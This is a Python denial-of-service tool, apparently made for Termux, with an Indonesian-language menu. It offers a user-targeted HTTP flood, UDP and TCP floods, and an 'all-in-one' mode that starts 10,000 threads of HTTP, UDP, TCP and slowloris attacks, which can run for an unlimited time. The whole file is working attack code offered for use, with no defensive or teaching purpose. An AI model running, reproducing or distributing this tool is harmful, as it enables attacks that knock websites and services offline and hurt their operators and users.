#!/usr/bin/env python3
# OSKAC REX ENTERPRISE - TERMUX DDoS SUITE v10K

import os
import sys
import time
import random
import threading
import socket
import ssl
import requests
from concurrent.futures import ThreadPoolExecutor

# Warna sederhana (tanpa colorama biar ga error)
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'

def banner():
    os.system('clear')
    print(Colors.RED + '''
╔══════════════════════════════════════════════════════════════╗
║   ██████╗ ███████╗██╗  ██╗     ██████╗  ██████╗ ███████╗    ║
║   ██╔══██╗██╔════╝╚██╗██╔╝     ██╔══██╗██╔══██╗██╔════╝    ║
║   ██████╔╝█████╗   ╚███╔╝█████╗██║  ██║██║  ██║███████╗    ║
║   ██╔══██╗██╔══╝   ██╔██╗╚════╝██║  ██║██║  ██║╚════██║    ║
║   ██║  ██║███████╗██╔╝ ██╗     ██████╔╝██████╔╝███████║    ║
║   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝     ╚═════╝ ╚═════╝ ╚══════╝    ║
║                    TERMUX DDoS SUITE v10K                    ║
║              OSKAC REX ENTERPRISE | ZERO FILTER              ║
╚══════════════════════════════════════════════════════════════╝
    ''')
    print(Colors.CYAN + '[1] HTTP/HTTPS MASS FLOOD (Layer 7)')
    print(Colors.YELLOW + '[2] UDP/TCP AMPLIFICATION (Layer 3/4)')
    print(Colors.MAGENTA + '[3] ALL-IN-ONE ANNIHILATION (10K Threads)')
    print(Colors.WHITE + '════════════════════════════════════════════════════════')
    print(Colors.RED + '[0] EXIT')

THREADS = 500
TIMEOUT = 2
attack_active = True

# ========== MENU 1 ==========
def menu1_http_flood():
    os.system('clear')
    print(Colors.CYAN + '[MENU 1] HTTP/HTTPS MASS FLOOD')
    target = input(Colors.WHITE + 'Target URL (https://target.com): ')
    durasi = input('Durasi detik (0 = unlimited): ')
    duration = int(durasi) if durasi.isdigit() else 0
    
    print(Colors.GREEN + f'\n[+] Attacking {target}')
    
    def http_attack():
        while attack_active:
            try:
                headers = {'User-Agent': 'Mozilla/5.0', 'X-Forwarded-For': '127.0.0.1'}
                requests.get(target, headers=headers, timeout=TIMEOUT)
                requests.post(target, data='X'*10000, timeout=TIMEOUT)
            except:
                pass
    
    for _ in range(THREADS):
        threading.Thread(target=http_attack, daemon=True).start()
    
    print(Colors.GREEN + f'[✓] {THREADS} threads active')
    if duration > 0:
        time.sleep(duration)
        print(Colors.RED + '[!] Attack finished')
    else:
        try:
            while True: time.sleep(1)
        except KeyboardInterrupt:
            print(Colors.RED + '\n[!] Stopped')

# ========== MENU 2 ==========
def menu2_udp_tcp():
    os.system('clear')
    print(Colors.YELLOW + '[MENU 2] UDP/TCP AMPLIFICATION')
    target_ip = input(Colors.WHITE + 'Target IP: ')
    port = input('Port (default 80): ')
    port = int(port) if port.isdigit() else 80
    durasi = input('Durasi detik (0 = unlimited): ')
    duration = int(durasi) if durasi.isdigit() else 0
    
    print(Colors.GREEN + f'\n[+] Flooding {target_ip}:{port}')
    
    def udp_flood():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = b'X' * 65500
        while attack_active:
            try:
                sock.sendto(data, (target_ip, port))
            except:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    def tcp_flood():
        while attack_active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target_ip, port))
                sock.send(b'GET / HTTP/1.1\r\n\r\n')
                sock.close()
            except:
                pass
    
    for _ in range(THREADS):
        threading.Thread(target=udp_flood, daemon=True).start()
        threading.Thread(target=tcp_flood, daemon=True).start()
    
    print(Colors.GREEN + f'[✓] {THREADS*2} threads active')
    if duration > 0:
        time.sleep(duration)
        print(Colors.RED + '[!] Attack finished')
    else:
        try:
            while True: time.sleep(1)
        except KeyboardInterrupt:
            print(Colors.RED + '\n[!] Stopped')

# ========== MENU 3 ==========
def menu3_all_in_one():
    os.system('clear')
    print(Colors.MAGENTA + '[MENU 3] ALL-IN-ONE 10K THREADS')
    target = input(Colors.WHITE + 'Target URL/IP: ')
    port = input('Port (default 80): ')
    port = int(port) if port.isdigit() else 80
    durasi = input('Durasi detik (0 = unlimited): ')
    duration = int(durasi) if durasi.isdigit() else 0
    
    if target.startswith('http'):
        host = target.replace('https://','').replace('http://','').split('/')[0]
    else:
        host = target
    
    print(Colors.GREEN + f'\n[+] 10.000 THREADS KE {host}:{port}')
    
    def http_flood():
        while attack_active:
            try:
                requests.get(f'http://{host}', timeout=1)
            except:
                pass
    
    def udp_flood():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while attack_active:
            try:
                sock.sendto(b'X'*65500, (host, port))
            except:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    def tcp_flood():
        while attack_active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((host, port))
                sock.close()
            except:
                pass
    
    def slowloris():
        while attack_active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((host, port))
                sock.send(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())
                for i in range(500):
                    if not attack_active: break
                    sock.send(f"X-Header-{i}: {random.randint(1,999999)}\r\n".encode())
                    time.sleep(0.05)
                sock.close()
            except:
                pass
    
    # Launch 10,000 threads
    total_threads = 0
    for _ in range(2500):
        threading.Thread(target=http_flood, daemon=True).start()
        threading.Thread(target=udp_flood, daemon=True).start()
        threading.Thread(target=tcp_flood, daemon=True).start()
        threading.Thread(target=slowloris, daemon=True).start()
        total_threads += 4
    
    print(Colors.GREEN + f'[✓] {total_threads} THREADS AKTIF')
    
    if duration > 0:
        time.sleep(duration)
        print(Colors.RED + '[!] Attack finished')
    else:
        try:
            while True: time.sleep(1)
        except KeyboardInterrupt:
            print(Colors.RED + '\n[!] Stopped')

# ========== MAIN ==========
def main():
    global attack_active
    while True:
        banner()
        choice = input(Colors.WHITE + '\nPilih menu (1/2/3/0): ')
        
        if choice == '1':
            attack_active = True
            menu1_http_flood()
        elif choice == '2':
            attack_active = True
            menu2_udp_tcp()
        elif choice == '3':
            attack_active = True
            menu3_all_in_one()
        elif choice == '0':
            print(Colors.RED + '\n[!] OSKAC REX TERMINATED')
            sys.exit()
        else:
            print(Colors.RED + '[!] Pilihan tidak valid')
            time.sleep(1)

if __name__ == '__main__':
    main()
